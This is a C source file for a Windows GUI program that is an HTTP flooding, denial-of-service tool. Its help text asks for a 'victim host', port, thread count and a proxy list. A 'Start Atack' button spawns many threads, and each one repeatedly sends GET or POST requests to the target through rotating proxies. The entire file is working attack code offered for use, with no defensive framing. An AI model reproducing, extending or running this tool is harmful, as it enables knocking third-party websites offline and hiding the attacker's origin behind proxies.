#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <curl/curl.h>
#include <pthread.h>
#include <windows.h>
#include <tchar.h>
#include <commctrl.h>

#include "Include/Definitions.h"
#include "Resource/resource.h"

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hInstancePrev, LPSTR lpArgs, int iShow)
{
	srand(time(NULL));

	InitClass(szWindowClass, hInstance, WindowProc);
	HWND hWnd = InitWindow(szWindowClass, szTitle, 400, 300, 650, 350, hInstance, iShow);

	MSG msg = {0};
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}


long long int __stdcall WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
		case WM_COMMAND:
		{
			switch (LOWORD(wParam))
			{
				case BUTTON_LAUNCH:
				{
					ButtonLaunch(hWnd);
					break;
				}
				case BUTTON_BROWSE:
				{
					OPENFILENAME ofn = {0};
					TCHAR buff[MAX_PATH] = {0};
					ofn.lStructSize = sizeof(OPENFILENAME);
					ofn.nMaxFile = MAX_PATH;
					ofn.Flags = OFN_FILEMUSTEXIST | OFN_EXPLORER;
					ofn.hwndOwner = hWnd;
					ofn.lpstrFile = buff;
					if (GetOpenFileName(&ofn))
						SetWindowText(hwndProxy, ofn.lpstrFile);
					break;
				}
				case BUTTON_HELP:
				{
					MessageBox(
							hWnd,
							_T("Host - victim host, indicated with network protocol. Example: http://exapmle.com/\n\
							Port - victim port. Example: 8080\n\
							Timeout - delay between sending network packets. Default value - 0. Example: 5\n\
							Threads - number of threads to send packets. Default value - 1. Example: 250\n\
							Method - package method (GET/POST). Default value - GET. Example: POST\n\
							Proxy file - File with a list of proxy servers in the format \"protocol://address:port\". Default not used. Example: proxy.txt"),
							_T("Help info"),
							MB_ICONINFORMATION);
					break;
				}
			}
			break;
		}
		case WM_PAINT:
		{
			PAINTSTRUCT ps = {0};
			BITMAP bm = {0};
			BeginPaint(hWnd, &ps);

			FillRect(ps.hdc, &ps.rcPaint, CreateSolidBrush(RGB(0, 0, 0)));

			HDC hdc = CreateCompatibleDC(ps.hdc);
			SelectObject(hdc, hImage);
			GetObject(hImage, sizeof(BITMAP), &bm);
			BitBlt(ps.hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdc, 0, 0, SRCCOPY);
			DeleteDC(hdc);

			hdc = CreateCompatibleDC(ps.hdc);
			SelectObject(hdc, hBackground);
			GetObject(hBackground, sizeof(BITMAP), &bm);
			BitBlt(ps.hdc, 240, 0, bm.bmWidth, bm.bmHeight, hdc, 0, 0, SRCCOPY);
			DeleteDC(hdc);

			EndPaint(hWnd, &ps);
			break;
		}
		case WM_CREATE:
		{
			dataArgs.wait = 1;
			dataArgs.status = 1;
			InitWidgets(hWnd);
			break;
		}
		case WM_DESTROY:
			PostQuitMessage(0);
			break;
		default:
			return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}

	return 0;
}


void InitClass(TCHAR *lpszClassName, HINSTANCE hInstance, WNDPROC lpfnWndProc)
{
	WNDCLASS wc = {0};

	wc.lpszClassName = lpszClassName;
	wc.hInstance = hInstance;
	wc.lpfnWndProc = lpfnWndProc;
	wc.hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON));

	RegisterClass(&wc);
}


HWND InitWindow(TCHAR *lpszClassName, TCHAR *lpszWindowTitle, LONG x, LONG y, int width, int height, HINSTANCE hInstance, int iShow)
{
	RECT rect;
	rect.left = x;
	rect.top = y;
	rect.right = x + width;
	rect.bottom = y + height;

	AdjustWindowRect(&rect, (UINT) WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX, 0);

	HWND hWnd = CreateWindow(lpszClassName, lpszWindowTitle, WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX,
				 rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, NULL, NULL, hInstance, NULL);

	ShowWindow(hWnd, iShow); 

	return hWnd;
}

void InitWidgets(HWND hWnd)
{
	hBackground = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BACKGROUND));
	hHelp = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_HELP));
	hStart = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_START));
	hStop = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_STOP));

	hImage = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(201 + rand() % 17));

	hwndHost = CreateWindow(_T("edit"), NULL, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 335, 24, 150, 16, hWnd, NULL, NULL, NULL);

	hwndPort = CreateWindow(_T("edit"), NULL, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 538, 24, 45, 16, hWnd, NULL, NULL, NULL);

	hwndMethod = CreateWindow(_T("edit"), NULL, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 365, 68, 68, 16, hWnd, NULL, NULL, NULL);

	hwndTimeout = CreateWindow(_T("edit"), NULL, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 365, 46, 68, 16, hWnd, NULL, NULL, NULL);

	hwndThreads = CreateWindow(_T("edit"), NULL, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 513, 46, 70, 16, hWnd, NULL, NULL, NULL);

	hwndProxy = CreateWindow(_T("edit"), NULL, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 372, 90, 133, 16, hWnd, NULL, NULL, NULL);	

	hwndBrowse = CreateWindow(_T("button"), _T("Browse..."), WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_CENTER | BS_VCENTER, 515, 90, 75, 16, hWnd, (HMENU) BUTTON_BROWSE, NULL, NULL);

	hwndHelp = CreateWindow(_T("button"), NULL, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_BITMAP, 282, 150, 125, 125, hWnd, (HMENU) BUTTON_HELP, NULL, NULL);
	SendMessage(hwndHelp, BM_SETIMAGE, IMAGE_BITMAP, (LPARAM) hHelp);
	hwndHelpPrompt = CreateWindow(_T("static"), _T("Help info"), WS_CHILD | WS_VISIBLE | SS_CENTER, 282, 275, 125, 16, hWnd, NULL, NULL, NULL);

	hwndLaunch = CreateWindow(_T("button"), NULL, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_BITMAP, 417, 125, 190, 190, hWnd, (HMENU) BUTTON_LAUNCH, NULL, NULL);
	SendMessage(hwndLaunch, BM_SETIMAGE, IMAGE_BITMAP, (LPARAM) hStart);
	hwndLaunchPrompt = CreateWindow(_T("static"), _T("Start Atack"), WS_CHILD | WS_VISIBLE | SS_CENTER, 417, 315, 190, 16, hWnd, NULL, NULL, NULL); 
}

size_t writefunction(char *buffer, size_t size, size_t nitem, void *n)
{
	return 0;
}

void* ThreadSend(void *args)
{
	TCHAR *buffer[128] = {0};
	
	TCHAR *host = ((data *) args)->host;
	TCHAR *port = ((data *) args)->port;
	TCHAR *method = ((data *) args)->method;
	int timeout = ((data *) args)->timeout;
	FILE *proxy = ((data *) args)->proxy;
	
	if (((data *) args)->proxy != NULL) {
		if (fscanf(proxy, "%s", buffer) == EOF) {
			fseek(proxy, SEEK_SET, 0);
			fscanf(proxy, "%s", buffer);
		}
	}

	CURL *curl = NULL;
	curl = curl_easy_init();
	curl_easy_setopt(curl, CURLOPT_URL, host);
	curl_easy_setopt(curl, CURLOPT_PORT, atoi(port));
	curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
	if (proxy != NULL)
		curl_easy_setopt(curl, CURLOPT_PROXY, buffer);
	if (strcmp(method, _T("POST")) == 0) {
		curl_easy_setopt(curl, CURLOPT_POST, 1L);
		curl_easy_setopt(curl, CURLOPT_HTTPGET, 0);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, _T("data=true&name=anon"));
	}
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunction);
	curl_easy_setopt(curl, CURLOPT_TIMEOUT, timeout);

	while ( ((data *) args)->wait )
		Sleep(1000);

	int i = 1;
	while ( ((data *) args)->status ) {
		curl_easy_perform(curl);
		if (strcmp(method, _T("random")) == 0)
			
		if (proxy != NULL && i == 250) {
			if (fscanf(proxy, "%s", buffer) == EOF) {
				fseek(proxy, SEEK_SET, 0);
				fscanf(proxy, "%s", buffer);
			}
			curl_easy_setopt(curl, CURLOPT_PROXY, buffer);
			i = 0;
		}
		i++;
	}

	curl_easy_cleanup(curl);

	return NULL;
}

void ButtonLaunch(HWND hWnd)
{
	if (bStarting) {
		StopThreads();
		free(hThreads);
		if (dataArgs.proxy)
			fclose(dataArgs.proxy);

		EnableWindow(hwndHost, TRUE);
		EnableWindow(hwndPort, TRUE);
		EnableWindow(hwndTimeout, TRUE);
		EnableWindow(hwndThreads, TRUE);
		EnableWindow(hwndMethod, TRUE);
		EnableWindow(hwndProxy, TRUE);
		EnableWindow(hwndBrowse, TRUE);

		SendMessage(hwndLaunch, BM_SETIMAGE, IMAGE_BITMAP, (LPARAM) hStart);
		SetWindowText(hwndLaunchPrompt, _T("Start Atack"));
		return;
	}

	TCHAR buff[1024];
	BOOLEAN MustHaveVariables = 1;

	if (!GetWindowText(hwndHost, buff, 1024)) {
		MustHaveVariables = 0;
		MessageBox(hWnd, _T("You didn't enter host-address."), _T("Error!"), MB_ICONERROR);
	}
	else
		strncpy(dataArgs.host, buff, 1024);

	if (!GetWindowText(hwndPort, buff, 1024)) {
		MustHaveVariables = 0;
		MessageBox(hWnd, _T("You didn't enter port."), _T("Error!"), MB_ICONERROR);
	}
	else if (MustHaveVariables)
		strncpy(dataArgs.port, buff, 1024);

	if (!MustHaveVariables)
		return;

	if (!GetWindowText(hwndMethod, buff, 1024))
		strcpy(dataArgs.method, _T("GET"));
	else
		strncpy(dataArgs.method, buff, 1024);

	if (!GetWindowText(hwndTimeout, buff, 1024))
		dataArgs.timeout = 0;
	else
		dataArgs.timeout = atoi(buff);

	if (!GetWindowText(hwndProxy, buff, 1024))
		dataArgs.proxy = NULL;
	else
		dataArgs.proxy = fopen(buff, _T("r"));	

	if (!GetWindowText(hwndThreads, buff, 1024)) {
		iThreads = 1;
		hThreads = (pthread_t *) malloc(sizeof(HANDLE));
	}
	else {
		iThreads = atoi(buff);
		hThreads = (pthread_t *) malloc(sizeof(HANDLE) * iThreads);
	}

	StartThreads();

	EnableWindow(hwndHost, FALSE);
	EnableWindow(hwndPort, FALSE);
	EnableWindow(hwndTimeout, FALSE);
	EnableWindow(hwndThreads, FALSE);
	EnableWindow(hwndMethod, FALSE);
	EnableWindow(hwndProxy, FALSE);
	EnableWindow(hwndBrowse, FALSE);

	SendMessage(hwndLaunch, BM_SETIMAGE, IMAGE_BITMAP, (LPARAM) hStop);
	SetWindowText(hwndLaunchPrompt, _T("Stop Atack"));
}

void StartThreads()
{
	bStarting = 1;

	for (int i = 0; i < iThreads; i++)
		pthread_create(hThreads + i, NULL, ThreadSend, (void *) &dataArgs);

	dataArgs.wait = 0;
}

void StopThreads()
{
	bStarting = 0;
	dataArgs.status = 0;

	for (int i = 0; i < iThreads; i++) {
		pthread_join(hThreads[i], NULL);
	}

	dataArgs.status = 1;
	dataArgs.wait = 1;
}
